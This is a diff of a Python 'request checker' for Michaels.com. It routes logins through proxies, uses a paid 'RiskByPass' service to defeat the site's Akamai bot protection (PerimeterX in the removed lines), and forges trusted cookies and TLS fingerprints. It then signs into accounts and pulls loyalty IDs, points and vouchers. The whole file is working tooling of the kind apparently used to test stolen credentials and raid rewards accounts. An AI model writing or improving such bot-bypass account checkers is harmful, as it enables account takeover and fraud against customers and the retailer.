@@ -2,17 +2,18 @@
 """
 Michaels.com request checker powered by RiskByPass.
 
-Runs each step of the sign-in and Michaels Rewards flow and reports pass/fail
-with details. Uses RB for PerimeterX (and optional Akamai) bypass, curl_cffi for
-TLS-impersonated HTTP, and RB tls_forward as POST fallback.
+Flow (matches RB official akamai demos):
+  1. curl_cffi GET /signin  -> init cookies + fresh akamai JS URL
+  2. RB akamai (with page_fp) -> trusted _abck segment 0
+  3. RB tls_forward for all API calls (sign-in, loyalty, rewards)
 """
 
 from __future__ import annotations
 
 import argparse
-import base64
 import json
 import os
+import re
 import sys
 import uuid
 from dataclasses import asdict, dataclass, field
@@ -23,6 +24,8 @@ from curl_cffi import requests as cffi_requests
 from rb_client import (
     RiskByPassClient,
     RiskByPassError,
+    TlsResponse,
+    abck_trust_segment,
     apply_rb_cookies,
     merge_cookies,
 )
@@ -31,6 +34,7 @@ BASE = "https://www.michaels.com"
 SIGNIN_URL = f"{BASE}/signin"
 USER_API = f"{BASE}/api/usr"
 RWD_API = f"{BASE}/api/rewards"
+REWARDS_REFERER = f"{BASE}/buyertools/rewards/my-rewards"
 
 DESKTOP_UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -79,7 +83,6 @@ class CheckerReport:
 
 
 def parse_proxy(raw: str) -> str:
-    """Accept host:port:user:pass or http://user:pass@host:port."""
     raw = raw.strip()
     if raw.startswith("http://") or raw.startswith("https://"):
         return raw
@@ -92,12 +95,12 @@ def parse_proxy(raw: str) -> str:
     raise ValueError(f"Invalid proxy format: {raw!r}")
 
 
-def device_uuid() -> str:
-    return str(uuid.uuid4())
+def scrape_akamai_js_urls(html: str) -> list[str]:
+    urls = re.findall(r"https://www\.michaels\.com/akam/[^\"'\s>]+", html)
+    return [u for u in urls if "pixel_" not in u]
 
 
 def summarize_rewards(data: dict[str, Any]) -> dict[str, Any]:
-    """Pull the high-value rewards fields from memberLookUp response."""
     summary: dict[str, Any] = {}
     members = data.get("member") or data.get("data", {}).get("member") or []
     if isinstance(members, list) and members:
@@ -155,167 +158,111 @@ class MichaelsChecker:
         email: str = "",
         password: str = "",
         *,
-        px_app_id: str | None = None,
-        px_attempts: int = 3,
-        use_akamai: bool = True,
+        akamai_attempts: int = 10,
     ) -> None:
         self.rb = rb
         self.proxy = proxy
         self.proxy_dict = {"http": proxy, "https": proxy}
         self.email = email
         self.password = password
-        self.px_app_id = px_app_id
-        self.px_attempts = px_attempts
-        self.use_akamai = use_akamai
+        self.akamai_attempts = akamai_attempts
         self.cookies: dict[str, str] = {}
         self.ua = DESKTOP_UA
         self.auth_token = ""
         self.loyalty_id: str | None = None
-        self.device_uuid = device_uuid()
+        self.device_uuid = str(uuid.uuid4())
+        self.akamai_js_urls: list[str] = []
 
-    def _session(self) -> cffi_requests.Session:
-        s = cffi_requests.Session(impersonate="chrome131")
-        s.headers.update(
-            {
-                "User-Agent": self.ua,
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Lang": "en_US",
-                "Region": "US",
-            }
-        )
-        for k, v in self.cookies.items():
-            s.cookies.set(k, v, domain=".michaels.com")
-        if self.auth_token:
-            s.headers["Authorization"] = f"Bearer {self.auth_token}"
-        return s
+    def _api_headers(self, *, referer: str = SIGNIN_URL, auth: bool = False) -> dict[str, str]:
+        headers = {
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": "application/json",
+            "origin": BASE,
+            "referer": referer,
+            "lang": "en_US",
+            "region": "US",
+            "user-agent": self.ua,
+        }
+        if auth and self.auth_token:
+            headers["authorization"] = f"Bearer {self.auth_token}"
+        return headers
 
-    def _apply_response_cookies(self, session: cffi_requests.Session) -> None:
-        self.cookies.update(dict(session.cookies))
-
-    def _apply_rb_result(self, result: dict[str, Any]) -> None:
-        solved, ua = apply_rb_cookies(result)
-        self.cookies = merge_cookies(self.cookies, solved)
-        if ua:
-            self.ua = ua
+    def _merge_tls_cookies(self, resp: TlsResponse) -> None:
+        if resp.cookies:
+            self.cookies = merge_cookies(self.cookies, resp.cookies)
 
     def check_signin_page(self) -> CheckResult:
         name = "signin_page"
         try:
-            s = self._session()
-            s.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+            s = cffi_requests.Session(impersonate="chrome131")
+            s.headers.update(
+                {
+                    "User-Agent": self.ua,
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                }
+            )
             r = s.get(SIGNIN_URL, proxies=self.proxy_dict, timeout=30)
-            self._apply_response_cookies(s)
+            self.cookies = dict(s.cookies)
+            self.akamai_js_urls = scrape_akamai_js_urls(r.text)
+            seg = abck_trust_segment(self.cookies)
             blocked = r.status_code == 403 or "Access Denied" in r.text
             has_signin = "Sign In" in r.text or "signin" in r.text.lower()
-            px_cookies = [k for k in self.cookies if k.startswith("_px")]
             return CheckResult(
                 name=name,
                 ok=r.status_code == 200 and has_signin and not blocked,
                 status_code=r.status_code,
                 detail=(
-                    f"blocked={blocked} signin_text={has_signin} "
-                    f"px_cookies={px_cookies or 'none'}"
+                    f"_abck_segment={seg} akamai_js={self.akamai_js_urls[:1]} "
+                    f"cookies={list(self.cookies.keys())}"
                 ),
-                extra={"cookie_count": len(self.cookies)},
             )
         except Exception as exc:
             return CheckResult(name=name, ok=False, detail=str(exc))
 
-    def check_px_solve(self) -> CheckResult:
-        name = "rb_perimeterx"
+    def check_akamai_solve(self) -> CheckResult:
+        name = "rb_akamai"
+        if not self.akamai_js_urls:
+            return CheckResult(name=name, ok=False, detail="no akamai JS URL found on signin page")
         last_error = ""
-        solvers = [
-            ("invisible", self.rb.perimeterx_invisible),
-            ("hold", self.rb.perimeterx_hold),
-        ]
-        for attempt in range(1, self.px_attempts + 1):
-            kind, solver = solvers[(attempt - 1) % len(solvers)]
+        for attempt in range(1, self.akamai_attempts + 1):
+            js_url = self.akamai_js_urls[(attempt - 1) % len(self.akamai_js_urls)]
             try:
-                result = solver(
+                result = self.rb.akamai(
                     proxy=self.proxy,
                     target_url=SIGNIN_URL,
-                    px_app_id=self.px_app_id,
-                    init_cookies=self.cookies or None,
+                    akamai_js_url=js_url,
+                    init_cookies=self.cookies,
                 )
-                self._apply_rb_result(result)
-                px_cookies = [k for k in self.cookies if k.startswith("_px")]
-                if px_cookies:
+                solved, ua = apply_rb_cookies(result)
+                self.cookies = merge_cookies(self.cookies, solved)
+                if ua:
+                    self.ua = ua
+                seg = abck_trust_segment(self.cookies)
+                if seg == "0":
                     return CheckResult(
                         name=name,
                         ok=True,
-                        detail=f"{kind} solved on attempt {attempt}",
-                        extra={"attempt": attempt, "px_cookies": px_cookies},
+                        detail=f"trusted _abck on attempt {attempt}",
+                        extra={"attempt": attempt, "abck_segment": seg, "js_url": js_url},
                     )
+                last_error = f"_abck_segment={seg} after attempt {attempt}"
             except RiskByPassError as exc:
                 last_error = str(exc)
-                continue
-        px_cookies = [k for k in self.cookies if k.startswith("_px")]
+        seg = abck_trust_segment(self.cookies)
         return CheckResult(
             name=name,
-            ok=bool(px_cookies),
-            detail=last_error or f"best px_cookies={px_cookies or 'none'}",
-            extra={"attempts": self.px_attempts, "px_cookies": px_cookies},
+            ok=seg == "0",
+            detail=last_error or f"best _abck_segment={seg}",
+            extra={"abck_segment": seg, "attempts": self.akamai_attempts},
         )
 
-    def check_akamai_solve(self) -> CheckResult:
-        name = "rb_akamai"
-        if not self.use_akamai:
-            return CheckResult(name=name, ok=True, detail="skipped")
-        last_error = ""
-        try:
-            s = self._session()
-            s.headers["Accept"] = "text/html,*/*"
-            r = s.get(SIGNIN_URL, proxies=self.proxy_dict, timeout=30)
-            self._apply_response_cookies(s)
-            js_urls = []
-            for token in ('src="', "src='"):
-                start = 0
-                while True:
-                    idx = r.text.find(token, start)
-                    if idx == -1:
-                        break
-                    end = r.text.find(r.text[idx + len(token)], idx + len(token))
-                    if end != -1:
-                        url = r.text[idx + len(token) : end]
-                        if "akamai" in url.lower() or "/akam/" in url or "akam/" in url:
-                            if url.startswith("//"):
-                                url = "https:" + url
-                            js_urls.append(url)
-                    start = idx + 1
-            if not js_urls and "_abck" not in self.cookies:
-                return CheckResult(name=name, ok=True, detail="no akamai script detected")
-            for attempt, js_url in enumerate(js_urls[:3] or [""], start=1):
-                if not js_url:
-                    break
-                try:
-                    result = self.rb.akamai(
-                        proxy=self.proxy,
-                        target_url=SIGNIN_URL,
-                        akamai_js_url=js_url,
-                        init_cookies=self.cookies or None,
-                    )
-                    self._apply_rb_result(result)
-                    if self.cookies.get("_abck"):
-                        return CheckResult(
-                            name=name,
-                            ok=True,
-                            detail=f"_abck set via attempt {attempt}",
-                            extra={"js_url": js_url[:120]},
-                        )
-                except RiskByPassError as exc:
-                    last_error = str(exc)
-        except Exception as exc:
-            last_error = str(exc)
-        has_abck = bool(self.cookies.get("_abck"))
-        return CheckResult(
-            name=name,
-            ok=has_abck or not last_error,
-            detail=last_error or f"_abck={'set' if has_abck else 'missing'}",
-        )
-
-    def _signin_body(self) -> dict[str, Any]:
-        return {
+    def check_sign_in(self) -> CheckResult:
+        name = "sign_in"
+        if not self.email or not self.password:
+            return CheckResult(name=name, ok=False, detail="credentials not configured")
+        url = f"{USER_API}/user/sign-in-secure"
+        body = {
             "deviceUuid": self.device_uuid,
             "deviceType": 0,
             "deviceName": "Chrome",
@@ -324,35 +271,24 @@ class MichaelsChecker:
             "rememberMe": True,
             "platform": "web",
         }
-
-    def check_sign_in(self) -> CheckResult:
-        name = "sign_in"
-        if not self.email or not self.password:
-            return CheckResult(name=name, ok=False, detail="credentials not configured")
-        url = f"{USER_API}/user/sign-in-secure"
-        body = self._signin_body()
         try:
-            s = self._session()
-            s.headers.update(
-                {
-                    "Origin": BASE,
-                    "Referer": SIGNIN_URL,
-                    "Content-Type": "application/json",
-                }
+            resp = self.rb.tls_post(
+                url,
+                proxy=self.proxy,
+                headers=self._api_headers(),
+                cookies=self.cookies,
+                body=body,
             )
-            r = s.post(url, json=body, proxies=self.proxy_dict, timeout=30)
-            self._apply_response_cookies(s)
-            if r.status_code in (403, 429):
-                return self._tls_forward_check(name, url, "POST", body)
-            if r.status_code != 200:
+            self._merge_tls_cookies(resp)
+            if resp.status_code != 200:
                 return CheckResult(
                     name=name,
                     ok=False,
-                    status_code=r.status_code,
-                    detail=r.text[:300],
+                    status_code=resp.status_code,
+                    detail=resp.text[:300],
                 )
-            return self._parse_signin_response(name, r.json(), r.status_code)
-        except Exception as exc:
+            return self._parse_signin_response(name, resp.json(), resp.status_code)
+        except (RiskByPassError, json.JSONDecodeError, Exception) as exc:
             return CheckResult(name=name, ok=False, detail=str(exc))
 
     def _parse_signin_response(
@@ -396,19 +332,21 @@ class MichaelsChecker:
             return CheckResult(name=name, ok=False, detail="not authenticated")
         url = f"{RWD_API}/loyalty/findLoyaltyIdByUserId"
         try:
-            s = self._session()
-            s.headers.update({"Referer": f"{BASE}/buyertools/rewards/my-rewards"})
-            r = s.get(url, proxies=self.proxy_dict, timeout=30)
-            if r.status_code in (403, 429):
-                return self._tls_forward_check(name, url, "GET", None)
-            if r.status_code != 200:
+            resp = self.rb.tls_get(
+                url,
+                proxy=self.proxy,
+                headers=self._api_headers(referer=REWARDS_REFERER, auth=True),
+                cookies=self.cookies,
+            )
+            self._merge_tls_cookies(resp)
+            if resp.status_code != 200:
                 return CheckResult(
                     name=name,
                     ok=False,
-                    status_code=r.status_code,
-                    detail=r.text[:200],
+                    status_code=resp.status_code,
+                    detail=resp.text[:200],
                 )
-            data = r.json()
+            data = resp.json()
             loyalty_id = data.get("data") or data.get("loyaltyId")
             if isinstance(loyalty_id, dict):
                 loyalty_id = loyalty_id.get("loyaltyId") or loyalty_id.get("data")
@@ -420,7 +358,7 @@ class MichaelsChecker:
                 status_code=200,
                 detail=f"loyaltyId={self.loyalty_id}",
             )
-        except Exception as exc:
+        except (RiskByPassError, json.JSONDecodeError, Exception) as exc:
             return CheckResult(name=name, ok=False, detail=str(exc))
 
     def check_rewards(self) -> CheckResult:
@@ -444,108 +382,36 @@ class MichaelsChecker:
             "getVouchers": True,
         }
         try:
-            s = self._session()
-            s.headers.update(
-                {
-                    "Origin": BASE,
-                    "Referer": f"{BASE}/buyertools/rewards/my-rewards",
-                    "Content-Type": "application/json",
-                }
+            resp = self.rb.tls_post(
+                url,
+                proxy=self.proxy,
+                headers=self._api_headers(referer=REWARDS_REFERER, auth=True),
+                cookies=self.cookies,
+                body=body,
             )
-            r = s.post(url, json=body, proxies=self.proxy_dict, timeout=30)
-            if r.status_code in (403, 429):
-                return self._tls_forward_check(name, url, "POST", body, parse_rewards=True)
-            if r.status_code != 200:
+            self._merge_tls_cookies(resp)
+            if resp.status_code != 200:
                 return CheckResult(
                     name=name,
                     ok=False,
-                    status_code=r.status_code,
-                    detail=r.text[:300],
+                    status_code=resp.status_code,
+                    detail=resp.text[:300],
                 )
-            data = r.json()
+            data = resp.json()
             summary = summarize_rewards(data.get("data", data))
-            ok = bool(summary.get("availablePoints") is not None or summary.get("member") or summary)
             return CheckResult(
                 name=name,
-                ok=ok or bool(summary),
+                ok=bool(summary),
                 status_code=200,
                 detail=json.dumps(summary)[:500],
                 extra={"rewards_summary": summary, "raw": data},
             )
-        except Exception as exc:
+        except (RiskByPassError, json.JSONDecodeError, Exception) as exc:
             return CheckResult(name=name, ok=False, detail=str(exc))
-
-    def _tls_forward_check(
-        self,
-        name: str,
-        url: str,
-        method: str,
-        body: dict[str, Any] | None,
-        *,
-        parse_rewards: bool = False,
-    ) -> CheckResult:
-        try:
-            headers = {
-                "User-Agent": self.ua,
-                "Accept": "application/json, text/plain, */*",
-                "Origin": BASE,
-                "Referer": SIGNIN_URL,
-                "Content-Type": "application/json",
-                "Lang": "en_US",
-                "Region": "US",
-            }
-            if self.auth_token:
-                headers["Authorization"] = f"Bearer {self.auth_token}"
-            result = self.rb.tls_forward(
-                proxy=self.proxy,
-                target_url=url,
-                method=method,
-                headers=headers,
-                cookies=self.cookies,
-                ua=self.ua,
-                body=json.dumps(body) if body is not None else None,
-            )
-            status = result.get("status_code")
-            raw = ""
-            if result.get("body_base64"):
-                raw = base64.b64decode(result["body_base64"]).decode("utf-8", "replace")
-            if status == 200 and raw.startswith("{"):
-                data = json.loads(raw)
-                if parse_rewards:
-                    summary = summarize_rewards(data.get("data", data))
-                    return CheckResult(
-                        name=name,
-                        ok=bool(summary),
-                        status_code=status,
-                        detail=json.dumps(summary)[:500],
-                        extra={"rewards_summary": summary, "raw": data},
-                    )
-                if "sign_in" in name or "token" in raw:
-                    return self._parse_signin_response(name, data, status)
-                payload = data.get("data") or data
-                loyalty_id = payload if isinstance(payload, str) else payload.get("loyaltyId")
-                if loyalty_id:
-                    self.loyalty_id = str(loyalty_id)
-                return CheckResult(
-                    name=name,
-                    ok=bool(loyalty_id),
-                    status_code=status,
-                    detail=f"tls_forward loyaltyId={loyalty_id}",
-                )
-            return CheckResult(
-                name=name,
-                ok=False,
-                status_code=status,
-                detail=f"tls_forward: {raw[:200]}",
-            )
-        except RiskByPassError as exc:
-            return CheckResult(name=name, ok=False, detail=f"tls_forward failed: {exc}")
 
     def run(self) -> CheckerReport:
         report = CheckerReport(proxy=self.proxy, cookies=self.cookies)
 
-        report.add(self.check_signin_page())
-        report.add(self.check_px_solve())
         report.add(self.check_signin_page())
         report.add(self.check_akamai_solve())
 
@@ -570,17 +436,11 @@ class MichaelsChecker:
 
 def main() -> int:
     parser = argparse.ArgumentParser(description="Michaels RB request checker")
-    parser.add_argument("--token", default=os.environ.get("RB_TOKEN", ""), help="RiskByPass API token")
-    parser.add_argument(
-        "--proxy",
-        default=os.environ.get("RB_PROXY", ""),
-        help="Proxy (URL or host:port:user:pass)",
-    )
+    parser.add_argument("--token", default=os.environ.get("RB_TOKEN", ""))
+    parser.add_argument("--proxy", default=os.environ.get("RB_PROXY", ""))
     parser.add_argument("--email", default=os.environ.get("MICHAELS_EMAIL", ""))
     parser.add_argument("--password", default=os.environ.get("MICHAELS_PASSWORD", ""))
-    parser.add_argument("--px-app-id", default=os.environ.get("MICHAELS_PX_APP_ID", ""))
-    parser.add_argument("--px-attempts", type=int, default=3)
-    parser.add_argument("--no-akamai", action="store_true")
+    parser.add_argument("--akamai-attempts", type=int, default=10)
     parser.add_argument("--json", action="store_true", dest="json_out")
     args = parser.parse_args()
 
@@ -592,27 +452,18 @@ def main() -> int:
         return 2
 
     proxy = parse_proxy(args.proxy)
-    rb = RiskByPassClient(token=args.token)
+    rb = RiskByPassClient(token=args.token, timeout=180)
     checker = MichaelsChecker(
         rb,
         proxy,
         email=args.email,
         password=args.password,
-        px_app_id=args.px_app_id or None,
-        px_attempts=args.px_attempts,
-        use_akamai=not args.no_akamai,
+        akamai_attempts=args.akamai_attempts,
     )
     report = checker.run()
 
     if args.json_out:
-        payload = report.to_dict()
-        if report.rewards is None and any(
-            r.extra.get("rewards_summary") for r in report.results
-        ):
-            for r in report.results:
-                if r.extra.get("rewards_summary"):
-                    payload["rewards"] = r.extra["rewards_summary"]
-        print(json.dumps(payload, indent=2))
+        print(json.dumps(report.to_dict(), indent=2))
     else:
         print(f"Michaels Request Checker  proxy={proxy.split('@')[-1]}")
         print("-" * 60)
